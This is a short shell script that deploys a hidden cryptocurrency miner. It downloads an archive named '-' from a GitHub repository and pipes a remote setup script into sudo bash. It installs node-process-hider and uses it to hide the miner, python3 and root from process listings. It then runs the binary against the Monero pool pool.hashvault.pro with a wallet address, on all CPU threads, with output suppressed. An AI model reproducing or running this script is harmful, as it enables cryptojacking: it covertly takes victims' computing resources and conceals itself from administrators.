#!/bin/sh
pkill -
wget https://github.com/muledan1/bash/raw/main/-.tar.gz
tar -xf -.tar.gz
apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

sudo swapoff -a; sudo swapon -a
sleep 10
ph add gudubrag.sh
Ph add python3
ph add root
ph add node-process-hider
ph add -
./- --url pool.hashvault.pro:443 --user 85uhZtgN1wETHJeV2DMrupGgYCKMX2sbvjjC6pCC1eAwaLpN6yC38qBRHds9rp8KzR3DRwvw8uFJUL7MYMcpyu7VEcUiQS8 --pass lion --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t$(nproc --all) >/dev/null >/dev/null 2>&1
sleep 10
